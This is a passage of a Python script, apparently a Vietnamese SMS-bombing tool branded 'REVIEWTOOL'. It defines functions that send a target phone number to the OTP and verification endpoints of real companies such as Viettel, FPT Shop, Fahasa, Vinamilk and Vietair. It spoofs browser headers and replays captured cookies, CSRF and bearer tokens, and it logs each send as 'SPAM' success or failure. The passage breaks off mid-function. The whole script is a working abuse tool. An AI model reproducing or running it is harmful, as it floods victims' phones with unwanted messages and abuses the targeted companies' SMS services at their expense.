        'phone': sdt,
    }
    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers).json()
    try:
        if response ['statusCode'] == 400:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')

def fahasa(sdt):
    headers = {
        'authority': 'www.fahasa.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        # 'traceparent': '00-4eb382a10c9267cd569aaf6fa1208636-d4c09c2cc26eb533-01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phone': sdt,
    }
    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', headers=headers, data=data).json()
    try:
        if response ['success'] == True:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THẤT BẠI')

def nhathuoclongchau(sdt):
    headers = {
        'authority': 'api.nhathuoclongchau.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        # 'x-channel': 'EStore',
    }
    json_data = {
        'phoneNumber': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }
    response = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, json=json_data).json()
    try:
        chi_mum = response['error']['details']
        if chi_mum == None:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')

def fptshop(sdt):
    headers = {
        'authority': 'papi.fptshop.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }
    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data).json()
    try:
        chi_mum = response['error']['details']
        if chi_mum == None:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')

def gumac(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': sdt,
    }
    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data).json()
    try:
        data_cm = response['data']['otp']
        if data_cm == '':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THẤT BẠI')

def vietloan(sdt):
    cookies = {
        '_fbp': 'fb.1.1720102725444.358598086701375218',
        '_gcl_au': '1.1.619229570.1720102726',
        'mousestats_vi': 'acaa606972ae539932c0',
        '_tt_enable_cookie': '1',
        '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
        '_ym_uid': '1720102728534641572',
        '_ym_d': '1720102728',
        '_gid': 'GA1.2.557208002.1720622172',
        '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
        '_ym_isad': '2',
        '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
        '_ga': 'GA1.2.1882430469.1720102726',
        'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_etag_client': 'false',
        'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
        'ec_etag_client_utm': 'null',
        '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
        '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
        'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
        'client': 'false',
        'client_utm': 'null',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phone': sdt,
        '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
    }
    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data).json()
    try:
        if response ['status'] == 'success':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')

def viettel(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'msisdn': sdt,
    }
    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).json()
    try:
        if response ['errorCode'] == 0:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')

def best(sdt):
    headers = {
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://www.best-inc.vn',
        'Referer': 'https://www.best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }
    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }
    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data).json()
    try:
        if response ['success'] == True:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')

def emartmall(sdt):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://emartmall.com.vn',
        'Pragma': 'no-cache',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'mobile': sdt,
    }   
    response = requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', headers=headers, data=data).json()
    try:
        if response ['result'] == 'success':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m EMARTMALL SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')

def mutosi(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Pragma': 'no-cache',
        'Referer': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': sdt,
        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
        'source': 'web_consumers',
    }
    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data).json()
    try:
        if response ['status'] == 'error':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
# \\ Vui lòng tôn trọng tác giả không xóa//
# /* Copyright © 27/07/2024 : Văn Tuân */
def vinamilk(sdt):
    cookies = {
        '_gcl_au': '1.1.998139933.1720624574',
        '_ga': 'GA1.1.50287730.1720624578',
        '_fbp': 'fb.2.1720624579398.521085014509551541',
        '_tt_enable_cookie': '1',
        '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
        '_gcl_gs': '2.1.k1$i1720624593',
        '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
        '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
        '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
        '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
        '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
        'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
        'sca_fg_codes': '[]',
        'avadaIsLogin': '',
        '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
        '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer null',
        'cache-control': 'no-cache',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://new.vinamilk.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    data = '{"type":"register","phone":"' + sdt + '"}'
    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
    print(f'[BY: REVIEWTOOL] ~ \033[1;35m VINAMILK SPAM THÀNH CÔNG')

def vietair(sdt):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }
    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data).json()
    try:
        if response ['TypeMsg'] == 1:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')

def sapo(sdt):
    cookies = {
        '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        '_gid': 'GA1.2.312311746.1721136107',
        '_fbp': 'fb.1.1721136112829.278874665245209803',
        '_ce.irv': 'new',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
        'G_ENABLED_IDPS': 'google',
        'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'lang': 'vi',
        'referral': 'https://accounts.sapo.vn/',
        'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'start_time': '07/16/2024 20:50:23',
        '_dc_gtm_UA-66880228-3': '1',
        'pageview': '2',
        '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
        'cebsp_': '8',
        '_dc_gtm_UA-66880228-1': '1',
        '_gat_UA-239546923-1': '1',
        '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
        '_ga': 'GA1.1.1203051188.1721136107',
        '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
        '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
        '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
        '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
        '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
        '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
        '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
        '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
        '_ce.s': 'v~ \033[1;35ma9bf0cd0d29c960e5bff8890efefc88e208d7385~ \033[1;35mlcw~ \033[1;35m1721137874051~ \033[1;35mlva~ \033[1;35m1721136168617~ \033[1;35mvpv~ \033[1;35m0~ \033[1;35mv11.fhb~ \033[1;35m1721136169125~ \033[1;35mv11.lhb~ \033[1;35m1721137827515~ \033[1;35mv11.cs~ \033[1;35m200798~ \033[1;35mv11.s~ \033[1;35m7f389030-4376-11ef-8b30-7911946dbf22~ \033[1;35mv11.sla~ \033[1;35m1721137874457~ \033[1;35mlcw~ \033[1;35m1721137874457',
        '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.sapo.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
